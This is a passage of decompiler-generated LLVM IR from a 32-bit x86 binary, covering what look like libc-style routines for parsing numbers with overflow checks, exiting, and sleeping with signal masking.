  %v0_80515cf = phi i32 [ %v0_80515bc, %dec_label_pc_80515ac ], [ %v1_80515bc, %dec_label_pc_80515bc ]
  %v1_80515bf = and i32 %arg3, -17
  %v2_80515bf = icmp eq i32 %v1_80515bf, 0
  %v1_80515c5 = icmp eq i1 %v2_80515bf, false
  br i1 %v1_80515c5, label %dec_label_pc_80515eb, label %dec_label_pc_80515c7

dec_label_pc_80515c7:                             ; preds = %dec_label_pc_80515bd
  %v1_80515c7 = add i32 %arg3, 10
  store i32 %v1_80515c7, i32* %esi.global-to-local, align 4
  %v1_80515ca = inttoptr i32 %v0_80515cf to i8*
  %v2_80515ca = load i8, i8* %v1_80515ca, align 1
  %v8_80515ca = icmp eq i8 %v2_80515ca, 48
  %v1_80515cd = icmp eq i1 %v8_80515ca, false
  br i1 %v1_80515cd, label %dec_label_pc_80515e1, label %dec_label_pc_80515cf

dec_label_pc_80515cf:                             ; preds = %dec_label_pc_80515c7
  %v1_80515cf = add i32 %v0_80515cf, 1
  store i32 %v1_80515cf, i32* %ebx.global-to-local, align 4
  %v1_80515d0 = add i32 %arg3, 8
  store i32 %v1_80515d0, i32* %esi.global-to-local, align 4
  %v1_80515d5 = inttoptr i32 %v1_80515cf to i8*
  %v2_80515d5 = load i8, i8* %v1_80515d5, align 1
  %v3_80515d5 = zext i8 %v2_80515d5 to i32
  %v5_80515d5 = and i32 %v4_80515d5, -256
  %v6_80515d5 = or i32 %v5_80515d5, %v3_80515d5
  %v1_80515d7 = or i32 %v6_80515d5, 32
  %v3_80515d7 = trunc i32 %v1_80515d7 to i8
  store i32 %v1_80515d7, i32* %eax.global-to-local, align 4
  %v10_80515da = icmp eq i8 %v3_80515d7, 120
  %v1_80515dc = icmp eq i1 %v10_80515da, false
  br i1 %v1_80515dc, label %dec_label_pc_80515e1, label %dec_label_pc_80515de

dec_label_pc_80515de:                             ; preds = %dec_label_pc_80515cf
  %v2_80515de = mul i32 %v1_80515d0, 2
  store i32 %v2_80515de, i32* %esi.global-to-local, align 4
  %v1_80515e0 = add i32 %v0_80515cf, 2
  store i32 %v1_80515e0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80515e1

dec_label_pc_80515e1:                             ; preds = %dec_label_pc_80515cf, %dec_label_pc_80515c7, %dec_label_pc_80515de
  %v0_805160a25 = phi i32 [ %v1_80515cf, %dec_label_pc_80515cf ], [ %v0_80515cf, %dec_label_pc_80515c7 ], [ %v1_80515e0, %dec_label_pc_80515de ]
  %v0_805166133 = phi i32 [ %v1_80515cf, %dec_label_pc_80515cf ], [ %v4_8051591, %dec_label_pc_80515c7 ], [ %v1_80515cf, %dec_label_pc_80515de ]
  %v0_80515e1 = phi i32 [ %v1_80515d0, %dec_label_pc_80515cf ], [ %v1_80515c7, %dec_label_pc_80515c7 ], [ %v2_80515de, %dec_label_pc_80515de ]
  %v7_80515e4 = icmp sgt i32 %v0_80515e1, 16
  br i1 %v7_80515e4, label %dec_label_pc_80515eb.thread, label %dec_label_pc_80515eb

dec_label_pc_80515eb.thread:                      ; preds = %dec_label_pc_80515e1
  store i32 16, i32* %esi.global-to-local, align 4
  store i32 14, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80515f5

dec_label_pc_80515eb:                             ; preds = %dec_label_pc_80515e1, %dec_label_pc_80515bd
  %v0_805166134 = phi i32 [ %v0_805166133, %dec_label_pc_80515e1 ], [ %v4_8051591, %dec_label_pc_80515bd ]
  %v0_805160a26 = phi i32 [ %v0_805160a25, %dec_label_pc_80515e1 ], [ %v0_80515cf, %dec_label_pc_80515bd ]
  %v0_80515fa = phi i32 [ %v0_80515e1, %dec_label_pc_80515e1 ], [ %arg3, %dec_label_pc_80515bd ]
  %v1_80515eb = add i32 %v0_80515fa, -2
  store i32 %v1_80515eb, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_80515f3 = icmp ugt i32 %v1_80515eb, 34
  br i1 %v6_80515f3, label %dec_label_pc_8051656, label %dec_label_pc_80515f5

dec_label_pc_80515f5:                             ; preds = %dec_label_pc_80515eb.thread, %dec_label_pc_80515eb
  %v0_80515fa58 = phi i32 [ 16, %dec_label_pc_80515eb.thread ], [ %v0_80515fa, %dec_label_pc_80515eb ]
  %v0_805160a2657 = phi i32 [ %v0_805160a25, %dec_label_pc_80515eb.thread ], [ %v0_805160a26, %dec_label_pc_80515eb ]
  %v0_80516613456 = phi i32 [ %v0_805166133, %dec_label_pc_80515eb.thread ], [ %v0_805166134, %dec_label_pc_80515eb ]
  %div = udiv i32 -1, %v0_80515fa58
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp51 = urem i32 -1, %v0_80515fa58
  %v1_80515fc = trunc i32 %tmp51 to i8
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8051636 = urem i32 %arg4, 256
  br label %dec_label_pc_805160a

dec_label_pc_8051608:                             ; preds = %dec_label_pc_805164c, %dec_label_pc_8051636
  %v4_805160a.pre = phi i32 [ %v1_8051620, %dec_label_pc_805164c ], [ %v4_805160a.pre.pre, %dec_label_pc_8051636 ]
  %v0_8051608 = phi i32 [ %v1_8051627, %dec_label_pc_805164c ], [ %v0_8051608.pre, %dec_label_pc_8051636 ]
  br label %dec_label_pc_805160a

dec_label_pc_805160a:                             ; preds = %dec_label_pc_80515f5, %dec_label_pc_8051608
  %v0_805166132 = phi i32 [ %v0_80516613456, %dec_label_pc_80515f5 ], [ %v0_8051608, %dec_label_pc_8051608 ]
  %v0_8051627 = phi i32 [ %v0_805160a2657, %dec_label_pc_80515f5 ], [ %v0_8051608, %dec_label_pc_8051608 ]
  %v4_805160a = phi i32 [ %div, %dec_label_pc_80515f5 ], [ %v4_805160a.pre, %dec_label_pc_8051608 ]
  %v1_805160a = inttoptr i32 %v0_8051627 to i8*
  %v2_805160a = load i8, i8* %v1_805160a, align 1
  %v3_805160a = zext i8 %v2_805160a to i32
  %v5_805160a = and i32 %v4_805160a, -256
  %v6_805160a = or i32 %v3_805160a, %v5_805160a
  store i32 %v6_805160a, i32* %eax.global-to-local, align 4
  %v1_805160c = add i32 %v6_805160a, -48
  %v1_805160f = trunc i32 %v1_805160c to i8
  %tmp59 = icmp ult i8 %v1_805160f, 10
  br i1 %tmp59, label %dec_label_pc_8051620, label %dec_label_pc_8051614

dec_label_pc_8051614:                             ; preds = %dec_label_pc_805160a
  %v1_8051614 = or i32 %v6_805160a, 32
  %v3_8051614 = trunc i32 %v1_8051614 to i8
  store i32 %v1_8051614, i32* %eax.global-to-local, align 4
  %v1_8051617 = and i32 %v1_805160c, -256
  %v2_8051617 = or i32 %v1_8051617, 40
  %tmp60 = icmp ult i8 %v3_8051614, 97
  br i1 %tmp60, label %dec_label_pc_8051620, label %dec_label_pc_805161d

dec_label_pc_805161d:                             ; preds = %dec_label_pc_8051614
  %v1_805161d = add i32 %v1_8051614, -87
  br label %dec_label_pc_8051620

dec_label_pc_8051620:                             ; preds = %dec_label_pc_8051614, %dec_label_pc_805160a, %dec_label_pc_805161d
  %v0_805164f = phi i32 [ %v2_8051617, %dec_label_pc_8051614 ], [ %v1_805160c, %dec_label_pc_805160a ], [ %v1_805161d, %dec_label_pc_805161d ]
  %v1_8051620 = urem i32 %v0_805164f, 256
  store i32 %v1_8051620, i32* %eax.global-to-local, align 4
  %v1_8051623 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051623 = sub i32 %v1_8051620, %v1_8051623
  %v10_8051623 = and i32 %v2_8051623, %v1_8051623
  %v11_8051623 = icmp slt i32 %v10_8051623, 0
  %v13_8051623 = icmp slt i32 %v2_8051623, 0
  %v2_8051625 = icmp eq i1 %v13_8051623, %v11_8051623
  br i1 %v2_8051625, label %dec_label_pc_8051656, label %dec_label_pc_8051627

dec_label_pc_8051627:                             ; preds = %dec_label_pc_8051620
  %v1_8051627 = add i32 %v0_8051627, 1
  store i32 %v1_8051627, i32* %ebx.global-to-local, align 4
  %v0_8051628 = load i32, i32* %edx.global-to-local, align 4
  %tmp61 = icmp ugt i32 %v0_8051628, %div
  br i1 %tmp61, label %dec_label_pc_8051636, label %dec_label_pc_805162e

dec_label_pc_805162e:                             ; preds = %dec_label_pc_8051627
  %v15_8051628 = icmp eq i32 %v0_8051628, %div
  %v1_805162e = icmp eq i1 %v15_8051628, false
  br i1 %v1_805162e, label %dec_label_pc_805164c, label %dec_label_pc_8051630

dec_label_pc_8051630:                             ; preds = %dec_label_pc_805162e
  %v1_8051630 = trunc i32 %v0_805164f to i8
  %tmp62 = icmp ugt i8 %v1_8051630, %v1_80515fc
  br i1 %tmp62, label %dec_label_pc_8051636, label %dec_label_pc_805164c

dec_label_pc_8051636:                             ; preds = %dec_label_pc_8051630, %dec_label_pc_8051627
  store i32 %v4_8051636, i32* %eax.global-to-local, align 4
  %v0_805163a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805163a = and i32 %v0_805163a, %v4_8051636
  store i32 %v2_805163a, i32* %ebp.global-to-local, align 4
  %v1_805163c = call i32 @function_8050089(i32 %div)
  store i32 %v1_805163c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8051644 = inttoptr i32 %v1_805163c to i32*
  store i32 34, i32* %v1_8051644, align 4
  %v0_8051608.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805160a.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051608

dec_label_pc_805164c:                             ; preds = %dec_label_pc_8051630, %dec_label_pc_805162e
  %v4_805164c = mul i32 %v0_8051628, %v1_8051623
  store i32 %v1_8051620, i32* %eax.global-to-local, align 4
  %v2_8051652 = add i32 %v4_805164c, %v1_8051620
  store i32 %v2_8051652, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051608

dec_label_pc_8051656:                             ; preds = %dec_label_pc_8051620, %dec_label_pc_80515eb
  %v0_8051661 = phi i32 [ %v0_805166134, %dec_label_pc_80515eb ], [ %v0_805166132, %dec_label_pc_8051620 ]
  %stack_var_-24.0 = phi i32 [ %tmp41, %dec_label_pc_80515eb ], [ %div, %dec_label_pc_8051620 ]
  %v4_8051656 = icmp eq i32 %arg2, 0
  br i1 %v4_8051656, label %dec_label_pc_8051663, label %dec_label_pc_805165d

dec_label_pc_805165d:                             ; preds = %dec_label_pc_8051656
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8051661 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8051661, i32* %v2_8051661, align 4
  br label %dec_label_pc_8051663

dec_label_pc_8051663:                             ; preds = %dec_label_pc_8051656, %dec_label_pc_805165d
  %v0_8051663 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_8051663, i32* %eax.global-to-local, align 4
  %v1_8051665 = trunc i32 %v0_8051663 to i8
  %v6_8051665 = icmp eq i8 %v1_8051665, 0
  %v2_8051667 = zext i1 %v6_8051665 to i32
  %v1_80516693 = or i32 %v2_8051667, -2147483648
  store i32 %v1_80516693, i32* %ebx.global-to-local, align 4
  %v5_805166f = icmp eq i8 %tmp, 0
  br i1 %v5_805166f, label %dec_label_pc_8051687, label %dec_label_pc_8051676

dec_label_pc_8051676:                             ; preds = %dec_label_pc_8051663
  %v0_8051676 = load i32, i32* %edx.global-to-local, align 4
  %tmp63 = icmp ugt i32 %v0_8051676, %v1_80516693
  br i1 %tmp63, label %dec_label_pc_805167a, label %dec_label_pc_8051687

dec_label_pc_805167a:                             ; preds = %dec_label_pc_8051676
  %v1_805167a = call i32 @function_8050089(i32 %stack_var_-24.0)
  store i32 %v1_805167a, i32* %eax.global-to-local, align 4
  %v0_805167f = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805167f, i32* %edx.global-to-local, align 4
  %v1_8051681 = inttoptr i32 %v1_805167a to i32*
  store i32 34, i32* %v1_8051681, align 4
  %v0_8051687.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051687

dec_label_pc_8051687:                             ; preds = %dec_label_pc_8051676, %dec_label_pc_8051663, %dec_label_pc_805167a
  %v0_8051687 = phi i32 [ %v0_8051663, %dec_label_pc_8051676 ], [ %v0_8051663, %dec_label_pc_8051663 ], [ %v0_8051687.pre, %dec_label_pc_805167a ]
  store i32 %v0_8051687, i32* %eax.global-to-local, align 4
  %v3_8051689 = trunc i32 %v0_8051687 to i8
  %v4_8051689 = icmp eq i8 %v3_8051689, 0
  %v0_8051692.pre = load i32, i32* %edx.global-to-local, align 4
  br i1 %v4_8051689, label %dec_label_pc_805168f, label %dec_label_pc_805168d

dec_label_pc_805168d:                             ; preds = %dec_label_pc_8051687
  %v1_805168d = sub i32 0, %v0_8051692.pre
  store i32 %v1_805168d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805168f

dec_label_pc_805168f:                             ; preds = %dec_label_pc_8051687, %dec_label_pc_805168d
  %v0_8051692 = phi i32 [ %v1_805168d, %dec_label_pc_805168d ], [ %v0_8051692.pre, %dec_label_pc_8051687 ]
  store i32 %v0_8051692, i32* %eax.global-to-local, align 4
  %v2_8051694 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051694, i32* @ebx, align 4
  ret i32 %v0_8051692

; uselistorder directives
  uselistorder i32 %v0_8051692, { 1, 0 }
  uselistorder i32 %v0_8051687, { 1, 0 }
  uselistorder i32 %v0_8051628, { 0, 2, 1 }
  uselistorder i32 %v1_8051627, { 1, 0 }
  uselistorder i32 %v2_8051623, { 1, 0 }
  uselistorder i32 %v1_8051620, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_805164f, { 1, 0 }
  uselistorder i32 %v0_8051608, { 1, 0 }
  uselistorder i32 %v4_8051636, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_80515fa58, { 1, 0 }
  uselistorder i32 %v0_805166134, { 1, 0 }
  uselistorder i32 %v2_80515de, { 1, 0 }
  uselistorder i32 %v1_80515d7, { 1, 0 }
  uselistorder i32 %v1_80515d0, { 1, 0, 2 }
  uselistorder i32 %v0_80515cf, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_80515d5, { 2, 0, 1 }
  uselistorder i32 %v1_805159d, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8051591, { 3, 2, 1, 0, 4 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 6, 1, 7, 2, 3, 4, 5, 8, 10, 9 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 17, 14, 15, 16 }
  uselistorder i8 10, { 0, 1, 2, 3, 8, 5, 6, 9, 7, 4 }
  uselistorder i8 48, { 0, 2, 1 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 32, { 16, 15, 1, 2, 3, 4, 5, 6, 7, 10, 11, 8, 12, 13, 14, 0, 9 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805168f, { 1, 0 }
  uselistorder label %dec_label_pc_8051687, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051663, { 1, 0 }
  uselistorder label %dec_label_pc_8051620, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805160a, { 1, 0 }
  uselistorder label %dec_label_pc_80515f5, { 1, 0 }
  uselistorder label %dec_label_pc_80515e1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80515bd, { 1, 0 }
  uselistorder label %dec_label_pc_80515bc, { 1, 0 }
  uselistorder label %dec_label_pc_805159d, { 1, 0 }
}

define i32 @function_8051699(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051699:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_80516ac = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80516ac, i32* @ebx, align 4
  %v2_80516b1 = call i32 @function_8051a10(i32 %v2_80516ac, i32 134552077)
  %v1_80516bd = call i32 @function_8051a0d(i32 ptrtoint (i32* @global_var_805306c.212 to i32))
  %v0_80516c2 = load i32, i32* @global_var_80530e0.213, align 32
  store i32 %v0_80516c2, i32* @eax, align 4
  %v1_80516ca = icmp eq i32 %v0_80516c2, 0
  br i1 %v1_80516ca, label %dec_label_pc_80516d7, label %dec_label_pc_80516ce

dec_label_pc_80516ce:                             ; preds = %dec_label_pc_8051699
  %v0_80516d1 = load i32, i32* @esi, align 4
  %v1_80516d2 = call i32 @unknown_0(i32 %v0_80516d1)
  store i32 %v1_80516d2, i32* @eax, align 4
  br label %dec_label_pc_80516d7

dec_label_pc_80516d7:                             ; preds = %dec_label_pc_8051699, %dec_label_pc_80516ce
  %v2_80516dc = call i32 @function_8051a10(i32 %v2_80516ac, i32 1)
  %v0_80516e1 = call i32 @function_80519ce()
  %v0_80516fa = load i32, i32* @esi, align 4
  %v1_80516fb = call i32 @function_8051db0(i32 %v0_80516fa)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8051db0, { 1, 0 }
  uselistorder i32 (i32)* @function_8051a0d, { 7, 6, 5, 4, 3, 10, 0, 1, 9, 8, 2 }
  uselistorder i32 (i32, i32)* @function_8051a10, { 10, 9, 8, 7, 2, 13, 6, 0, 5, 1, 12, 11, 4, 3 }
  uselistorder label %dec_label_pc_80516d7, { 1, 0 }
}

define i32 @function_8051700(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051700:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8051700 = load i32, i32* @ebp, align 4
  %v0_8051701 = load i32, i32* @edi, align 4
  %v0_8051702 = load i32, i32* @esi, align 4
  %v0_8051703 = load i32, i32* @ebx, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_8051716 = icmp eq i32 %arg1, 0
  %v1_8051718 = icmp eq i1 %v1_8051716, false
  br i1 %v1_8051718, label %dec_label_pc_805171f.lr.ph, label %dec_label_pc_8051877

dec_label_pc_805171f.lr.ph:                       ; preds = %dec_label_pc_8051700
  %v15_8051704 = ptrtoint i32* %stack_var_-444 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805171f56 = add i32 %v15_8051704, 416
  %v5_805171f57 = inttoptr i32 %v4_805171f56 to i32*
  store i32 0, i32* %v5_805171f57, align 4
  %v0_805172a58 = load i32, i32* %eax.global-to-local, align 4
  %v1_805172a59 = add i32 %v0_805172a58, -1
  %v9_805172a60 = icmp slt i32 %v1_805172a59, 0
  store i32 %v1_805172a59, i32* %eax.global-to-local, align 4
  %v1_805172b61 = icmp eq i1 %v9_805172a60, false
  br i1 %v1_805172b61, label %dec_label_pc_805171f.dec_label_pc_805171f_crit_edge, label %dec_label_pc_805172d

dec_label_pc_805171f.dec_label_pc_805171f_crit_edge: ; preds = %dec_label_pc_805171f.lr.ph, %dec_label_pc_805171f.dec_label_pc_805171f_crit_edge
  %v1_805172a62 = phi i32 [ %v1_805172a, %dec_label_pc_805171f.dec_label_pc_805171f_crit_edge ], [ %v1_805172a59, %dec_label_pc_805171f.lr.ph ]
  %v0_805171f.pre = load i32, i32* @esp, align 4
  %v2_805171f = mul i32 %v1_805172a62, 4
  %v3_805171f = add i32 %v0_805171f.pre, 292
  %v4_805171f = add i32 %v3_805171f, %v2_805171f
  %v5_805171f = inttoptr i32 %v4_805171f to i32*
  store i32 0, i32* %v5_805171f, align 4
  %v0_805172a = load i32, i32* %eax.global-to-local, align 4
  %v1_805172a = add i32 %v0_805172a, -1
  %v9_805172a = icmp slt i32 %v1_805172a, 0
  store i32 %v1_805172a, i32* %eax.global-to-local, align 4
  %v1_805172b = icmp eq i1 %v9_805172a, false
  br i1 %v1_805172b, label %dec_label_pc_805171f.dec_label_pc_805171f_crit_edge, label %dec_label_pc_805172d

dec_label_pc_805172d:                             ; preds = %dec_label_pc_805171f.dec_label_pc_805171f_crit_edge, %dec_label_pc_805171f.lr.ph
  %v1_805172a.lcssa = phi i32 [ %v1_805172a59, %dec_label_pc_805171f.lr.ph ], [ %v1_805172a, %dec_label_pc_805171f.dec_label_pc_805171f_crit_edge ]
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8051743 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8051743, i32* @ebx, align 4
  store i32 %v2_8051743, i32* %stack_var_-460, align 4
  %v4_805174b = call i32 @function_805049e(i32 %v2_8051743, i32 17, i32 %v1_805172a.lcssa, i32 %v1_805172a.lcssa)
  store i32 %v4_805174b, i32* %eax.global-to-local, align 4
  %v2_8051753 = icmp slt i32 %v4_805174b, 0
  br i1 %v2_8051753, label %dec_label_pc_805187b, label %dec_label_pc_805175b

dec_label_pc_805175b:                             ; preds = %dec_label_pc_805172d
  %v2_805175c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_805175c, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8051767 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8051767 = call i32 @function_804fdbd(i32 0, %_TYPEDEF_sigset_t* %v3_8051767, i32 %v2_805175c)
  store i32 %v4_8051767, i32* %eax.global-to-local, align 4
  %v1_805176f = icmp eq i32 %v4_8051767, 0
  %v1_8051771 = icmp eq i1 %v1_805176f, false
  br i1 %v1_8051771, label %dec_label_pc_805187b, label %dec_label_pc_8051777

dec_label_pc_8051777:                             ; preds = %dec_label_pc_805175b
  store i32 %v2_805175c, i32* %stack_var_-460, align 4
  %v4_805177c = call i32 @function_805047a(i32 %v2_805175c, i32 17, i32 %v4_8051767, i32 %v4_8051767)
  store i32 %v4_805177c, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8051789 = icmp eq i32 %v4_805177c, 0
  br i1 %v1_8051789, label %dec_label_pc_8051792.lr.ph, label %dec_label_pc_8051845

dec_label_pc_8051792.lr.ph:                       ; preds = %dec_label_pc_8051777
  store i32 31, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v5_805171f57, align 4
  %v0_805179d50 = load i32, i32* %edx.global-to-local, align 4
  %v1_805179d51 = add i32 %v0_805179d50, -1
  %v9_805179d52 = icmp slt i32 %v1_805179d51, 0
  store i32 %v1_805179d51, i32* %edx.global-to-local, align 4
  %v1_805179e53 = icmp eq i1 %v9_805179d52, false
  br i1 %v1_805179e53, label %dec_label_pc_8051792.dec_label_pc_8051792_crit_edge, label %dec_label_pc_80517a0

dec_label_pc_8051792.dec_label_pc_8051792_crit_edge: ; preds = %dec_label_pc_8051792.lr.ph, %dec_label_pc_8051792.dec_label_pc_8051792_crit_edge
  %v1_805179d54 = phi i32 [ %v1_805179d, %dec_label_pc_8051792.dec_label_pc_8051792_crit_edge ], [ %v1_805179d51, %dec_label_pc_8051792.lr.ph ]
  %v0_8051792.pre = load i32, i32* @esp, align 4
  %v2_8051792 = mul i32 %v1_805179d54, 4
  %v3_8051792 = add i32 %v0_8051792.pre, 292
  %v4_8051792 = add i32 %v3_8051792, %v2_8051792
  %v5_8051792 = inttoptr i32 %v4_8051792 to i32*
  store i32 0, i32* %v5_8051792, align 4
  %v0_805179d = load i32, i32* %edx.global-to-local, align 4
  %v1_805179d = add i32 %v0_805179d, -1
  %v9_805179d = icmp slt i32 %v1_805179d, 0
  store i32 %v1_805179d, i32* %edx.global-to-local, align 4
  %v1_805179e = icmp eq i1 %v9_805179d, false
  br i1 %v1_805179e, label %dec_label_pc_8051792.dec_label_pc_8051792_crit_edge, label %dec_label_pc_80517a0

dec_label_pc_80517a0:                             ; preds = %dec_label_pc_8051792.dec_label_pc_8051792_crit_edge, %dec_label_pc_8051792.lr.ph
  store i32 %v2_8051743, i32* %eax.global-to-local, align 4
  store i32 %v2_8051743, i32* %stack_var_-460, align 4
  %v4_80517ac = call i32 @function_805049e(i32 %v2_8051743, i32 17, i32 0, i32 0)
  store i32 %v4_80517ac, i32* %eax.global-to-local, align 4
  %v2_80517b4 = icmp slt i32 %v4_80517ac, 0
  br i1 %v2_80517b4, label %dec_label_pc_805187b, label %dec_label_pc_80517bc

dec_label_pc_80517bc:                             ; preds = %dec_label_pc_80517a0
  %v2_80517bd = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_80517bd, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_80517c6 = call i32 @function_8051c4f(i32 17, i32* null, i32 %v2_80517bd)
  store i32 %v4_80517c6, i32* %eax.global-to-local, align 4
  %v2_80517ce = icmp slt i32 %v4_80517c6, 0
  %v1_80517d0 = icmp eq i1 %v2_80517ce, false
  br i1 %v1_80517d0, label %dec_label_pc_80517fa, label %dec_label_pc_80517d2

dec_label_pc_80517d2:                             ; preds = %dec_label_pc_80517bc
  %v0_80517d2 = load i32, i32* %stack_var_-460, align 4
  %v1_80517d2 = call i32 @function_8050089(i32 %v0_80517d2)
  store i32 %v1_80517d2, i32* %eax.global-to-local, align 4
  store i32 %v1_80517d2, i32* @ebx, align 4
  %v1_80517d9 = inttoptr i32 %v1_80517d2 to i32*
  %v2_80517d9 = load i32, i32* %v1_80517d9, align 4
  store i32 %v2_80517d9, i32* @esi, align 4
  store i32 %v2_805175c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80517e8 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80517e8 = call i32 @function_804fdbd(i32 2, %_TYPEDEF_sigset_t* %v3_80517e8, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80517f3 = load i32, i32* @esi, align 4
  %v1_80517f3 = load i32, i32* @ebx, align 4
  %v2_80517f3 = inttoptr i32 %v1_80517f3 to i32*
  store i32 %v0_80517f3, i32* %v2_80517f3, align 4
  %v0_8051888.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805187e

dec_label_pc_80517fa:                             ; preds = %dec_label_pc_80517bc
  %v3_80517fa = load i32, i32* %stack_var_-420, align 4
  %v12_80517fa = icmp eq i32 %v3_80517fa, 1
  %v2_8051806 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051806, i32* @ebx, align 4
  %v1_805180d = icmp eq i1 %v12_80517fa, false
  br i1 %v1_805180d, label %dec_label_pc_8051834, label %dec_label_pc_805180f

dec_label_pc_805180f:                             ; preds = %dec_label_pc_80517fa
  %v0_805180f = load i32, i32* @edi, align 4
  store i32 %v2_8051806, i32* %stack_var_-460, align 4
  %v4_8051813 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8051813 = call i32 @function_80521a7(%timespec* %v4_8051813, i32 %v2_8051806, i32 %v0_805180f, i32 %v0_805180f)
  store i32 %v5_8051813, i32* %eax.global-to-local, align 4
  store i32 %v5_8051813, i32* @edi, align 4
  %v1_805181a = call i32 @function_8050089(i32 %v2_8051806)
  store i32 %v1_805181a, i32* %eax.global-to-local, align 4
  store i32 %v1_805181a, i32* @ebx, align 4
  %v1_8051824 = inttoptr i32 %v1_805181a to i32*
  %v2_8051824 = load i32, i32* %v1_8051824, align 4
  store i32 %v2_8051824, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805182b = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805182b = call i32 @function_804fdbd(i32 2, %_TYPEDEF_sigset_t* %v3_805182b, i32 0)
  store i32 %v4_805182b, i32* %eax.global-to-local, align 4
  %v0_8051830 = load i32, i32* @esi, align 4
  %v1_8051830 = load i32, i32* @ebx, align 4
  %v2_8051830 = inttoptr i32 %v1_8051830 to i32*
  store i32 %v0_8051830, i32* %v2_8051830, align 4
  %v0_805185a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051857

dec_label_pc_8051834:                             ; preds = %dec_label_pc_80517fa
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805183a = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805183a = call i32 @function_804fdbd(i32 2, %_TYPEDEF_sigset_t* %v3_805183a, i32 0)
  store i32 %v4_805183a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051850

dec_label_pc_8051845:                             ; preds = %dec_label_pc_8051777
  %v2_8051847 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051847, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051850

dec_label_pc_8051850:                             ; preds = %dec_label_pc_8051834, %dec_label_pc_8051845
  %storemerge3.pre-phi = phi i32 [ %v2_8051806, %dec_label_pc_8051834 ], [ %v2_8051847, %dec_label_pc_8051845 ]
  %v3_8051850 = phi i32 [ %v2_805175c, %dec_label_pc_8051834 ], [ %v4_805177c, %dec_label_pc_8051845 ]
  %v2_8051850 = phi i32 [ 0, %dec_label_pc_8051834 ], [ %v4_805177c, %dec_label_pc_8051845 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8051850 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8051850 = call i32 @function_80521a7(%timespec* %v4_8051850, i32 %storemerge3.pre-phi, i32 %v2_8051850, i32 %v3_8051850)
  store i32 %v5_8051850, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051857

